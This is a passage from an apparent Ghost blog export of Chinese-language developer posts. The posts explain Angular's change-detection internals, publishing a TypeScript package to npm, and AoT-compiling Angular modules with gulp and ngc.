class=\"language-typescript\">export const enum ViewFlags {\n  None = 0,\n  OnPush = 1 &lt;&lt; 1,\n}\n</code></pre>\n<h2 id=\"viewstate\">ViewState</h2>\n<p>ViewState视图状态与ChangeDetectorStatus对应。使用位码做状态，好处是可以同一时间处于多个状态。</p>\n<pre><code class=\"language-typescript\">export const enum ViewState {\n  BeforeFirstCheck = 1 &lt;&lt; 0,\n  FirstCheck = 1 &lt;&lt; 1,\n  Attached = 1 &lt;&lt; 2,\n  ChecksEnabled = 1 &lt;&lt; 3,\n  IsProjectedView = 1 &lt;&lt; 4,\n  CheckProjectedView = 1 &lt;&lt; 5,\n  CheckProjectedViews = 1 &lt;&lt; 6,\n  Destroyed = 1 &lt;&lt; 7,\n\n  CatDetectChanges = Attached | ChecksEnabled,  //处于Attached（已添加）和ChecksEnabled（开启更新）都是true\n  CatInit = BeforeFirstCheck | CatDetectChanges  //这个状态还加上了在第一检测之前的状态。\n}\n</code></pre>\n<h2 id=\"checkandupdateview\">checkAndUpdateView</h2>\n<p>视图的变化检测与更新，这是检查模板上面绑定的新数据和以前的对比。若变化则更新。当视图是OnPush时，去掉ChecksEnabled状态。</p>\n<pre><code class=\"language-typescript\">function callViewAction(view: ViewData, action: ViewAction) {\n  const viewState = view.state;\n  switch (action) {\n\t...\n    case ViewAction.CheckAndUpdate:\n      if ((viewState &amp; ViewState.Destroyed) === 0) {//组件不能处于Destroyed状态\n        if ((viewState &amp; ViewState.CatDetectChanges) === ViewState.CatDetectChanges) {//组件必须处于CatDetectChanges状态\n          checkAndUpdateView(view);  //执行变化检测\n        } else if (viewState &amp; ViewState.CheckProjectedViews) {\n          execProjectedViewsAction(view, ViewAction.CheckAndUpdateProjectedViews);\n        }\n      }\n      break;\n\t...\n\n  }\n}\n\nexport function checkAndUpdateView(view: ViewData) {\n  if (view.state &amp; ViewState.BeforeFirstCheck) {\n    view.state &amp;= ~ViewState.BeforeFirstCheck;\n    view.state |= ViewState.FirstCheck;\n  } else {\n    view.state &amp;= ~ViewState.FirstCheck;\n  }\n  markProjectedViewsForCheck(view);\n  Services.updateDirectives(view, CheckType.CheckAndUpdate);\n  execEmbeddedViewsAction(view, ViewAction.CheckAndUpdate);\n  execQueriesAction(\n      view, NodeFlags.TypeContentQuery, NodeFlags.DynamicQuery, CheckType.CheckAndUpdate);\n\n  callLifecycleHooksChildrenFirst(\n      view, NodeFlags.AfterContentChecked |\n          (view.state &amp; ViewState.FirstCheck ? NodeFlags.AfterContentInit : 0));\n\n  Services.updateRenderer(view, CheckType.CheckAndUpdate);\n\n  execComponentViewsAction(view, ViewAction.CheckAndUpdate);\n  execQueriesAction(\n      view, NodeFlags.TypeViewQuery, NodeFlags.DynamicQuery, CheckType.CheckAndUpdate);\n  callLifecycleHooksChildrenFirst(\n      view, NodeFlags.AfterViewChecked |\n          (view.state &amp; ViewState.FirstCheck ? NodeFlags.AfterViewInit : 0));\n\n  if (view.def.flags &amp; ViewFlags.OnPush) {\n    view.state &amp;= ~ViewState.ChecksEnabled;  //当视图是OnPush时，去掉ChecksEnabled状态。\n  }\n  view.state &amp;= ~(ViewState.CheckProjectedViews | ViewState.CheckProjectedView);\n}\n</code></pre>\n<h2 id=\"viewref\">ViewRef</h2>\n<ol>\n<li>\n<p>markForCheck(): void//从当前组件开始向上,当视图是OnPush时，添加ChecksEnabled状态,在进行一次变化检测后，会去掉ChecksEnabled状态。</p>\n<pre><code class=\"language-typescript\">markForCheck(): void { markParentViewsForCheck(this._view); }\nexport function markParentViewsForCheck(view: ViewData) {\n  let currView: ViewData|null = view;\n  while (currView) {\n    if (currView.def.flags &amp; ViewFlags.OnPush) {\n      currView.state |= ViewState.ChecksEnabled;  //当视图是OnPush时，添加ChecksEnabled状态。\n    }\n    currView = currView.viewContainerParent || currView.parent;  //从当前组件开始向上。\n  }\n}\n</code></pre>\n</li>\n<li>\n<p>​ detach(): void</p>\n<pre><code class=\"language-typescript\">detach(): void { this._view.state &amp;= ~ViewState.Attached; }  //去掉Attached状态\n</code></pre>\n</li>\n<li>\n<p>detectChanges(): void</p>\n</li>\n</ol>\n<pre><code class=\"language-typescript\">  detectChanges(): void {\n    const fs = this._view.root.rendererFactory;\n    if (fs.begin) {\n      fs.begin();\n    }\n    Services.checkAndUpdateView(this._view); //执行checkAndUpdateView函数\n    if (fs.end) {\n      fs.end();\n    }\n  }\n</code></pre>\n<ol start=\"4\">\n<li>\n<p>​ detach(): void</p>\n<pre><code class=\"language-typescript\">reattach(): void { this._view.state |= ViewState.Attached; } //添加Attached状态\n</code></pre>\n</li>\n</ol>\n<h2 id=\"applicationref\">ApplicationRef</h2>\n<p>ApplicationRef是根组件。订阅了zone通知，对自己和子节点进行变化检测，调用view.detectChanges()。</p>\n<pre><code class=\"language-typescript\">export class ApplicationRef_ extends ApplicationRef{\n    constructor(private _zone: NgZone, private _console: Console, private _injector: Injector,\n      private _exceptionHandler: ErrorHandler,\n      private _componentFactoryResolver: ComponentFactoryResolver,\n      private _initStatus: ApplicationInitStatus) {\n      ...\n      this._zone.onMicrotaskEmpty.subscribe(\n          {next: () =&gt; { this._zone.run(() =&gt; { this.tick(); }); }});//订阅zone的通知，然后执行tick变化检测的函数。\n      ...\n    }\n    tick(): void {\n      if (this._runningTick) {\n        throw new Error('ApplicationRef.tick is called recursively');\n      }\n\n      const scope = ApplicationRef_._tickScope();\n      try {\n        this._runningTick = true;\n        this._views.forEach((view) =&gt; view.detectChanges());//对自己和子节点进行变化检测。\n        if (this._enforceNoNewChanges) {\n          this._views.forEach((view) =&gt; view.checkNoChanges());\n        }\n      } catch (e) {\n        // Attention: Don't rethrow as it could cancel subscriptions to Observables!\n        this._zone.runOutsideAngular(() =&gt; this._exceptionHandler.handleError(e));\n      } finally {\n        this._runningTick = false;\n        wtfLeave(scope);\n      }\n  }\n}\n</code></pre>\n<h2 id=\"\">触发事件</h2>\n<p>组件即使在ChangeDetectionStrategy.OnPush的模式下，在自己范围内触发事件也可以触发一次变化检测。</p>\n<pre><code class=\"language-typescript\">export function dispatchEvent(\n    view: ViewData, nodeIndex: number, eventName: string, event: any): boolean|undefined {\n  try {\n    const nodeDef = view.def.nodes[nodeIndex];\n    const startView = nodeDef.flags &amp; NodeFlags.ComponentView ?\n        asElementData(view, nodeIndex).componentView :\n        view;\n    markParentViewsForCheck(startView);   //就是执行了markForCheck()。这样可以执行一次变化检测了。\n    return Services.handleEvent(view, nodeIndex, eventName, event);\n  } catch (e) {\n    // Attention: Don't rethrow, as it would cancel Observable subscriptions!\n    view.root.errorHandler.handleError(e);\n  }\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"117","plaintext":"angular变化检测实现原理\nViewFlags\nViewFlags视图更新方式与ChangeDetectionStrategy对应\n\nexport const enum ViewFlags {\n  None = 0,\n  OnPush = 1 << 1,\n}\n\n\nViewState\nViewState视图状态与ChangeDetectorStatus对应。使用位码做状态，好处是可以同一时间处于多个状态。\n\nexport const enum ViewState {\n  BeforeFirstCheck = 1 << 0,\n  FirstCheck = 1 << 1,\n  Attached = 1 << 2,\n  ChecksEnabled = 1 << 3,\n  IsProjectedView = 1 << 4,\n  CheckProjectedView = 1 << 5,\n  CheckProjectedViews = 1 << 6,\n  Destroyed = 1 << 7,\n\n  CatDetectChanges = Attached | ChecksEnabled,  //处于Attached（已添加）和ChecksEnabled（开启更新）都是true\n  CatInit = BeforeFirstCheck | CatDetectChanges  //这个状态还加上了在第一检测之前的状态。\n}\n\n\ncheckAndUpdateView\n视图的变化检测与更新，这是检查模板上面绑定的新数据和以前的对比。若变化则更新。当视图是OnPush时，去掉ChecksEnabled状态。\n\nfunction callViewAction(view: ViewData, action: ViewAction) {\n  const viewState = view.state;\n  switch (action) {\n\t...\n    case ViewAction.CheckAndUpdate:\n      if ((viewState & ViewState.Destroyed) === 0) {//组件不能处于Destroyed状态\n        if ((viewState & ViewState.CatDetectChanges) === ViewState.CatDetectChanges) {//组件必须处于CatDetectChanges状态\n          checkAndUpdateView(view);  //执行变化检测\n        } else if (viewState & ViewState.CheckProjectedViews) {\n          execProjectedViewsAction(view, ViewAction.CheckAndUpdateProjectedViews);\n        }\n      }\n      break;\n\t...\n\n  }\n}\n\nexport function checkAndUpdateView(view: ViewData) {\n  if (view.state & ViewState.BeforeFirstCheck) {\n    view.state &= ~ViewState.BeforeFirstCheck;\n    view.state |= ViewState.FirstCheck;\n  } else {\n    view.state &= ~ViewState.FirstCheck;\n  }\n  markProjectedViewsForCheck(view);\n  Services.updateDirectives(view, CheckType.CheckAndUpdate);\n  execEmbeddedViewsAction(view, ViewAction.CheckAndUpdate);\n  execQueriesAction(\n      view, NodeFlags.TypeContentQuery, NodeFlags.DynamicQuery, CheckType.CheckAndUpdate);\n\n  callLifecycleHooksChildrenFirst(\n      view, NodeFlags.AfterContentChecked |\n          (view.state & ViewState.FirstCheck ? NodeFlags.AfterContentInit : 0));\n\n  Services.updateRenderer(view, CheckType.CheckAndUpdate);\n\n  execComponentViewsAction(view, ViewAction.CheckAndUpdate);\n  execQueriesAction(\n      view, NodeFlags.TypeViewQuery, NodeFlags.DynamicQuery, CheckType.CheckAndUpdate);\n  callLifecycleHooksChildrenFirst(\n      view, NodeFlags.AfterViewChecked |\n          (view.state & ViewState.FirstCheck ? NodeFlags.AfterViewInit : 0));\n\n  if (view.def.flags & ViewFlags.OnPush) {\n    view.state &= ~ViewState.ChecksEnabled;  //当视图是OnPush时，去掉ChecksEnabled状态。\n  }\n  view.state &= ~(ViewState.CheckProjectedViews | ViewState.CheckProjectedView);\n}\n\n\nViewRef\n 1. markForCheck():\n    void//从当前组件开始向上,当视图是OnPush时，添加ChecksEnabled状态,在进行一次变化检测后，会去掉ChecksEnabled状态。\n    \n    markForCheck(): void { markParentViewsForCheck(this._view); }\n    export function markParentViewsForCheck(view: ViewData) {\n      let currView: ViewData|null = view;\n      while (currView) {\n        if (currView.def.flags & ViewFlags.OnPush) {\n          currView.state |= ViewState.ChecksEnabled;  //当视图是OnPush时，添加ChecksEnabled状态。\n        }\n        currView = currView.viewContainerParent || currView.parent;  //从当前组件开始向上。\n      }\n    }\n    \n    \n    \n 2. ​ detach(): void\n    \n    detach(): void { this._view.state &= ~ViewState.Attached; }  //去掉Attached状态\n    \n    \n    \n 3. detectChanges(): void\n    \n    \n\n  detectChanges(): void {\n    const fs = this._view.root.rendererFactory;\n    if (fs.begin) {\n      fs.begin();\n    }\n    Services.checkAndUpdateView(this._view); //执行checkAndUpdateView函数\n    if (fs.end) {\n      fs.end();\n    }\n  }\n\n\n 4. ​ detach(): void\n    \n    reattach(): void { this._view.state |= ViewState.Attached; } //添加Attached状态\n    \n    \n    \n\nApplicationRef\nApplicationRef是根组件。订阅了zone通知，对自己和子节点进行变化检测，调用view.detectChanges()。\n\nexport class ApplicationRef_ extends ApplicationRef{\n    constructor(private _zone: NgZone, private _console: Console, private _injector: Injector,\n      private _exceptionHandler: ErrorHandler,\n      private _componentFactoryResolver: ComponentFactoryResolver,\n      private _initStatus: ApplicationInitStatus) {\n      ...\n      this._zone.onMicrotaskEmpty.subscribe(\n          {next: () => { this._zone.run(() => { this.tick(); }); }});//订阅zone的通知，然后执行tick变化检测的函数。\n      ...\n    }\n    tick(): void {\n      if (this._runningTick) {\n        throw new Error('ApplicationRef.tick is called recursively');\n      }\n\n      const scope = ApplicationRef_._tickScope();\n      try {\n        this._runningTick = true;\n        this._views.forEach((view) => view.detectChanges());//对自己和子节点进行变化检测。\n        if (this._enforceNoNewChanges) {\n          this._views.forEach((view) => view.checkNoChanges());\n        }\n      } catch (e) {\n        // Attention: Don't rethrow as it could cancel subscriptions to Observables!\n        this._zone.runOutsideAngular(() => this._exceptionHandler.handleError(e));\n      } finally {\n        this._runningTick = false;\n        wtfLeave(scope);\n      }\n  }\n}\n\n\n触发事件\n组件即使在ChangeDetectionStrategy.OnPush的模式下，在自己范围内触发事件也可以触发一次变化检测。\n\nexport function dispatchEvent(\n    view: ViewData, nodeIndex: number, eventName: string, event: any): boolean|undefined {\n  try {\n    const nodeDef = view.def.nodes[nodeIndex];\n    const startView = nodeDef.flags & NodeFlags.ComponentView ?\n        asElementData(view, nodeIndex).componentView :\n        view;\n    markParentViewsForCheck(startView);   //就是执行了markForCheck()。这样可以执行一次变化检测了。\n    return Services.handleEvent(view, nodeIndex, eventName, event);\n  } catch (e) {\n    // Attention: Don't rethrow, as it would cancel Observable subscriptions!\n    view.root.errorHandler.handleError(e);\n  }\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-04T09:11:11.000Z","created_by":"1","updated_at":"2017-08-04T09:11:18.000Z","updated_by":"1","published_at":"2017-08-04T09:11:18.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d332","uuid":"0ab924cc-cee9-499a-8591-efa47d36a607","title":"npm package发布(TypeScript)","slug":"npm-packagefa-bu-typescript","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n## typings\\n\\n用typescript编写的项目，有一个优点。在使用的有时候有语法提示。在package.json加上`\\\"types\\\": \\\"./lib/index.d.ts\\\"`入口的*.d.ts文件。别人在使用你的库的，就会有语法提示了。\\n\\n| 选项               | 类型      | 默认值   | 描述                                       |\\n| :--------------- | ------- | ----- | ---------------------------------------- |\\n| --declaration    | boolean | false | 生成相应的.d.ts文件。                            |\\n| --declarationDir | string  |       | 生成声明文件的输出路径。默认为outDir路径。                 |\\n| --outDir         | string  |       | 重定向输出目录。                                 |\\n| --outFile        | string  |       | 将输出文件合并为一个文件。合并的顺序是根据传入编译器的文件顺序和///<reference``>和import的文件顺序决定的。 |\\n\\n\\n\\n## .npmignore\\n\\n如果这是npm publish忽略文件。如果没有就使用.gitignore。一般.npmignore和.gitignore还是不同，我们最好使自己的包在别人安装的时候，所有的都是必须的。\\n\\n## package.json\\n\\n- `\\\"main\\\": \\\"./lib/index.d.ts\\\"` main字段是表示这个包的入口js文件。使用tsc编译就行。千万不要使用webpack编译，webpack会把这个项目需要的包的代码直接生成在js中。如果这个包别的库也会用到。这样就打包了两次。\\n- devDependencies和dependencies区别，devDependencies是开发依赖，例如webpack，typescript，jest等。dependencies这时运行时的依赖库，如jquery。npm在安装你的包的时候，只会安装dependencies下的。\\n\\n## npm adduser\\n\\n在npm.org上注册一个账号就行，然后运行上面的命令。按提示输入就行。\\n\\n## license\\n\\n一般的开源软件的许可证有 [ISC](http://link.zhihu.com/?target=https%3A//opensource.org/licenses/ISC), [BSD](http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/BSD_licenses), [MIT](http://link.zhihu.com/?target=https%3A//opensource.org/licenses/MIT)，其实都是属于 Copyleft 的许可证，对软件的使用限制很少，发布时选择时候的许可证即可。npm 默认的是 ISC。\\n\\n## npm publish .\\n\\n运行`npm publish .`命令。\\n\\n1. 如果提示`no_perms Private mode enable, only admin can publish this module`，检查源是不是npm的。\\n2. 如提示`you do not have permission to publish xxxx`，一般是包名冲突了，换个名字publish 。\\n3. npm包package.json中registory属性一定要填写，每次publish npm时package.json中version版本一定要大于上一次。\\n4. npm unpublish半小时内你可以删除自己发布的库，之后你就再也不能删除了。\\n\\n## .travis.yml\\n\\n使用[travis](https://travis-ci.org/)持续集成你的项目，用户一般会对经过测试的项目是更加信赖。\\n\\n```yaml\\nlanguage: node_js\\nnode_js:\\n  - \\\"7\\\"\\n```\\n\\n```json\\n  \\\"scripts\\\": {\\n    \\\"build\\\": \\\"tsc\\\",\\n    \\\"test\\\": \\\"tsc&&jest\\\"\\n  },\\n```\\n\\n## 其他sourceMap\\n\\n1. 使用tsc编译，配置tsconfig中sourceMap为true就会生成sourceMap文件。\\n\\n2. 要使webpack生成的sourceMap，还要在webpack.config文件中，添加devtool : \\\"source-map\\\"。\\n\\n\\n\\n\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"typings\">typings</h2>\n<p>用typescript编写的项目，有一个优点。在使用的有时候有语法提示。在package.json加上<code>&quot;types&quot;: &quot;./lib/index.d.ts&quot;</code>入口的*.d.ts文件。别人在使用你的库的，就会有语法提示了。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">选项</th>\n<th>类型</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">--declaration</td>\n<td>boolean</td>\n<td>false</td>\n<td>生成相应的.d.ts文件。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">--declarationDir</td>\n<td>string</td>\n<td></td>\n<td>生成声明文件的输出路径。默认为outDir路径。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">--outDir</td>\n<td>string</td>\n<td></td>\n<td>重定向输出目录。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">--outFile</td>\n<td>string</td>\n<td></td>\n<td>将输出文件合并为一个文件。合并的顺序是根据传入编译器的文件顺序和///&lt;reference``&gt;和import的文件顺序决定的。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"npmignore\">.npmignore</h2>\n<p>如果这是npm publish忽略文件。如果没有就使用.gitignore。一般.npmignore和.gitignore还是不同，我们最好使自己的包在别人安装的时候，所有的都是必须的。</p>\n<h2 id=\"packagejson\">package.json</h2>\n<ul>\n<li><code>&quot;main&quot;: &quot;./lib/index.d.ts&quot;</code> main字段是表示这个包的入口js文件。使用tsc编译就行。千万不要使用webpack编译，webpack会把这个项目需要的包的代码直接生成在js中。如果这个包别的库也会用到。这样就打包了两次。</li>\n<li>devDependencies和dependencies区别，devDependencies是开发依赖，例如webpack，typescript，jest等。dependencies这时运行时的依赖库，如jquery。npm在安装你的包的时候，只会安装dependencies下的。</li>\n</ul>\n<h2 id=\"npmadduser\">npm adduser</h2>\n<p>在npm.org上注册一个账号就行，然后运行上面的命令。按提示输入就行。</p>\n<h2 id=\"license\">license</h2>\n<p>一般的开源软件的许可证有 <a href=\"http://link.zhihu.com/?target=https%3A//opensource.org/licenses/ISC\">ISC</a>, <a href=\"http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/BSD_licenses\">BSD</a>, <a href=\"http://link.zhihu.com/?target=https%3A//opensource.org/licenses/MIT\">MIT</a>，其实都是属于 Copyleft 的许可证，对软件的使用限制很少，发布时选择时候的许可证即可。npm 默认的是 ISC。</p>\n<h2 id=\"npmpublish\">npm publish .</h2>\n<p>运行<code>npm publish .</code>命令。</p>\n<ol>\n<li>如果提示<code>no_perms Private mode enable, only admin can publish this module</code>，检查源是不是npm的。</li>\n<li>如提示<code>you do not have permission to publish xxxx</code>，一般是包名冲突了，换个名字publish 。</li>\n<li>npm包package.json中registory属性一定要填写，每次publish npm时package.json中version版本一定要大于上一次。</li>\n<li>npm unpublish半小时内你可以删除自己发布的库，之后你就再也不能删除了。</li>\n</ol>\n<h2 id=\"travisyml\">.travis.yml</h2>\n<p>使用<a href=\"https://travis-ci.org/\">travis</a>持续集成你的项目，用户一般会对经过测试的项目是更加信赖。</p>\n<pre><code class=\"language-yaml\">language: node_js\nnode_js:\n  - &quot;7&quot;\n</code></pre>\n<pre><code class=\"language-json\">  &quot;scripts&quot;: {\n    &quot;build&quot;: &quot;tsc&quot;,\n    &quot;test&quot;: &quot;tsc&amp;&amp;jest&quot;\n  },\n</code></pre>\n<h2 id=\"sourcemap\">其他sourceMap</h2>\n<ol>\n<li>\n<p>使用tsc编译，配置tsconfig中sourceMap为true就会生成sourceMap文件。</p>\n</li>\n<li>\n<p>要使webpack生成的sourceMap，还要在webpack.config文件中，添加devtool : &quot;source-map&quot;。</p>\n</li>\n</ol>\n<!--kg-card-end: markdown-->","comment_id":"118","plaintext":"typings\n用typescript编写的项目，有一个优点。在使用的有时候有语法提示。在package.json加上\"types\": \"./lib/index.d.ts\"\n入口的*.d.ts文件。别人在使用你的库的，就会有语法提示了。\n\n选项类型默认值描述--declarationbooleanfalse生成相应的.d.ts文件。--declarationDirstring\n生成声明文件的输出路径。默认为outDir路径。--outDirstring重定向输出目录。--outFilestring\n将输出文件合并为一个文件。合并的顺序是根据传入编译器的文件顺序和///<reference``>和import的文件顺序决定的。.npmignore\n如果这是npm\npublish忽略文件。如果没有就使用.gitignore。一般.npmignore和.gitignore还是不同，我们最好使自己的包在别人安装的时候，所有的都是必须的。\n\npackage.json\n * \"main\": \"./lib/index.d.ts\" \n   main字段是表示这个包的入口js文件。使用tsc编译就行。千万不要使用webpack编译，webpack会把这个项目需要的包的代码直接生成在js中。如果这个包别的库也会用到。这样就打包了两次。\n * devDependencies和dependencies区别，devDependencies是开发依赖，例如webpack，typescript，jest等。dependencies这时运行时的依赖库，如jquery。npm在安装你的包的时候，只会安装dependencies下的。\n\nnpm adduser\n在npm.org上注册一个账号就行，然后运行上面的命令。按提示输入就行。\n\nlicense\n一般的开源软件的许可证有 ISC\n[http://link.zhihu.com/?target=https%3A//opensource.org/licenses/ISC], BSD\n[http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/BSD_licenses], \nMIT [http://link.zhihu.com/?target=https%3A//opensource.org/licenses/MIT]，其实都是属于\nCopyleft 的许可证，对软件的使用限制很少，发布时选择时候的许可证即可。npm 默认的是 ISC。\n\nnpm publish .\n运行npm publish .命令。\n\n 1. 如果提示no_perms Private mode enable, only admin can publish this module\n    ，检查源是不是npm的。\n 2. 如提示you do not have permission to publish xxxx，一般是包名冲突了，换个名字publish 。\n 3. npm包package.json中registory属性一定要填写，每次publish\n    npm时package.json中version版本一定要大于上一次。\n 4. npm unpublish半小时内你可以删除自己发布的库，之后你就再也不能删除了。\n\n.travis.yml\n使用travis [https://travis-ci.org/]持续集成你的项目，用户一般会对经过测试的项目是更加信赖。\n\nlanguage: node_js\nnode_js:\n  - \"7\"\n\n\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"test\": \"tsc&&jest\"\n  },\n\n\n其他sourceMap\n 1. 使用tsc编译，配置tsconfig中sourceMap为true就会生成sourceMap文件。\n    \n    \n 2. 要使webpack生成的sourceMap，还要在webpack.config文件中，添加devtool : \"source-map\"。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-07T09:45:03.000Z","created_by":"1","updated_at":"2017-08-07T09:45:09.000Z","updated_by":"1","published_at":"2017-08-07T09:45:09.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d333","uuid":"b10ed95f-a847-44d6-b0c9-65875324b055","title":"Angular模块编译和发布","slug":"angularmo-kuai-bian-yi-he-fa-bu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"## gulp-inline-ng2-template\\n\\n使用这个模块把，`templateUrl`和`styleUrls`的相对路径转`template`和`styles`。安装gulp4.0 `npm install gulpjs/gulp.git#4.0 --save-dev`\\n\\n```javascript\\nvar inlineTemplatesTask = lazypipe()\\n  .pipe(inlineTemplates, {\\n    base: '/src',\\n    useRelativePaths: true,\\n    templateProcessor: function (filepath, ext, file, cb) {\\n      var minifiedFile = htmlMinifier.minify(file, {\\n        collapseWhitespace: true,\\n        caseSensitive: true,\\n        removeComments: true,\\n        removeRedundantAttributes: true\\n      });\\n      cb(null, minifiedFile);\\n    },\\n  });\\n\\ngulp.task('ngc:templates', function () {\\n  return gulp.src(PATHS.src, { base: 'src' })\\n    .pipe(inlineTemplatesTask())\\n    .pipe(gulp.dest(PATHS.tsInline));\\n});\\n\\ngulp.task('ngc', gulp.series( 'ngc:templates', function __ngc(cb) {\\n  exec(`${executable} -p ./tsconfig-aot.json`, (e) => {\\n    if (e) console.log(e);\\n    del('./temp/aot');\\n    cb();\\n  }).stdout.on('data', function (data) { console.log(data); });\\n}));\\n//gulpfile.js\\n```\\n\\n## tsconfig-aot.json\\n\\n```\\n{\\n  \\\"compilerOptions\\\": {\\n    \\\"target\\\": \\\"es5\\\",\\n    \\\"lib\\\": [\\n      \\\"es2015\\\",\\n      \\\"dom\\\"\\n    ],\\n    \\\"module\\\": \\\"commonjs\\\",\\n    \\\"moduleResolution\\\": \\\"node\\\",\\n    \\\"declaration\\\": true,\\n    \\\"experimentalDecorators\\\": true,\\n    \\\"emitDecoratorMetadata\\\": true,\\n    \\\"outDir\\\": \\\"lib\\\",\\n    \\\"rootDir\\\": \\\"./temp/inline\\\",\\n    \\\"sourceMap\\\": true,\\n    \\\"inlineSources\\\": true,\\n    \\\"noImplicitAny\\\": false\\n  },\\n  \\\"typeRoots\\\": [\\n    // add path to @types\\n    \\\"node_modules/@types\\\"\\n  ],\\n  \\\"files\\\": [\\n    \\\"temp/inline/index.ts\\\"\\n  ],\\n  \\\"exclude\\\": [\\n    \\\"node_modules\\\"\\n  ],\\n  \\\"angularCompilerOptions\\\": {\\n    \\\"strictMetadataEmit\\\": true,\\n    \\\"genDir\\\": \\\"temp/aot\\\"\\n  }\\n}\\n```\\n\\n## AoT 编译\\n\\n首先安装`@angular/compiler-cli` `@angular/compiler`\\n\\n运行`ngc -p tsconfig-aot.json`是AoT 编译，要求严格的，不要使用tsc编译。遇到的一些坑。除了第二条不提示以外，其他按照提示改就行。\\n\\n1. template标签必须用ng-template代替。可能我用的@angular/compiler版本较高。\\n2. AoT 不支持\\\"export default class\\\",这个有点坑。不管是component还是module,不要用default导出。\\n3. interface和type等必须export出来。\\n\\n## npm publish\\n\\n按照上次npm包发布就行。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"gulpinlineng2template\">gulp-inline-ng2-template</h2>\n<p>使用这个模块把，<code>templateUrl</code>和<code>styleUrls</code>的相对路径转<code>template</code>和<code>styles</code>。安装gulp4.0 <code>npm install gulpjs/gulp.git#4.0 --save-dev</code></p>\n<pre><code class=\"language-javascript\">var inlineTemplatesTask = lazypipe()\n  .pipe(inlineTemplates, {\n    base: '/src',\n    useRelativePaths: true,\n    templateProcessor: function (filepath, ext, file, cb) {\n      var minifiedFile = htmlMinifier.minify(file, {\n        collapseWhitespace: true,\n        caseSensitive: true,\n        removeComments: true,\n        removeRedundantAttributes: true\n      });\n      cb(null, minifiedFile);\n    },\n  });\n\ngulp.task('ngc:templates', function () {\n  return gulp.src(PATHS.src, { base: 'src' })\n    .pipe(inlineTemplatesTask())\n    .pipe(gulp.dest(PATHS.tsInline));\n});\n\ngulp.task('ngc', gulp.series( 'ngc:templates', function __ngc(cb) {\n  exec(`${executable} -p ./tsconfig-aot.json`, (e) =&gt; {\n    if (e) console.log(e);\n    del('./temp/aot');\n    cb();\n  }).stdout.on('data', function (data) { console.log(data); });\n}));\n//gulpfile.js\n</code></pre>\n<h2 id=\"tsconfigaotjson\">tsconfig-aot.json</h2>\n<pre><code>{\n  &quot;compilerOptions&quot;: {\n    &quot;target&quot;: &quot;es5&quot;,\n    &quot;lib&quot;: [\n      &quot;es2015&quot;,\n      &quot;dom&quot;\n    ],\n    &quot;module&quot;: &quot;commonjs&quot;,\n    &quot;moduleResolution&quot;: &quot;node&quot;,\n    &quot;declaration&quot;: true,\n    &quot;experimentalDecorators&quot;: true,\n    &quot;emitDecoratorMetadata&quot;: true,\n    &quot;outDir&quot;: &quot;lib&quot;,\n    &quot;rootDir&quot;: &quot;./temp/inline&quot;,\n    &quot;sourceMap&quot;: true,\n    &quot;inlineSources&quot;: true,\n    &quot;noImplicitAny&quot;: false\n  },\n  &quot;typeRoots&quot;: [\n    // add path to @types\n    &quot;node_modules/@types&quot;\n  ],\n  &quot;files&quot;: [\n    &quot;temp/inline/index.ts&quot;\n  ],\n  &quot;exclude&quot;: [\n    &quot;node_modules&quot;\n  ],\n  &quot;angularCompilerOptions&quot;: {\n    &quot;strictMetadataEmit&quot;: true,\n    &quot;genDir&quot;: &quot;temp/aot&quot;\n  }\n}\n</code></pre>\n<h2 id=\"aot\">AoT 编译</h2>\n<p>首先安装<code>@angular/compiler-cli</code> <code>@angular/compiler</code></p>\n<p>运行<code>ngc -p tsconfig-aot.json</code>是AoT 编译，要求严格的，不要使用tsc编译。遇到的一些坑。除了第二条不提示以外，其他按照提示改就行。</p>\n<ol>\n<li>template标签必须用ng-template代替。可能我用的@angular/compiler版本较高。</li>\n<li>AoT 不支持&quot;export default class&quot;,这个有点坑。不管是component还是module,不要用default导出。</li>\n<li>interface和type等必须export出来。</li>\n</ol>\n<h2 id=\"npmpublish\">npm publish</h2>\n<p>按照上次npm包发布就行。</p>\n<!--kg-card-end: markdown-->","comment_id":"119","plaintext":"gulp-inline-ng2-template\n使用这个模块把，templateUrl和styleUrls的相对路径转template和styles。安装gulp4.0 npm install\ngulpjs/gulp.git#4.0 --save-dev\n\nvar inlineTemplatesTask = lazypipe()\n  .pipe(inlineTemplates, {\n    base: '/src',\n    useRelativePaths: true,\n    templateProcessor: function (filepath, ext, file, cb) {\n      var minifiedFile = htmlMinifier.minify(file, {\n        collapseWhitespace: true,\n        caseSensitive: true,\n        removeComments: true,\n        removeRedundantAttributes: true\n      });\n      cb(null, minifiedFile);\n    },\n  });\n\ngulp.task('ngc:templates', function () {\n  return gulp.src(PATHS.src, { base: 'src' })\n    .pipe(inlineTemplatesTask())\n    .pipe(gulp.dest(PATHS.tsInline));\n});\n\ngulp.task('ngc', gulp.series( 'ngc:templates', function __ngc(cb) {\n  exec(`${executable} -p ./tsconfig-aot.json`, (e) => {\n    if (e) 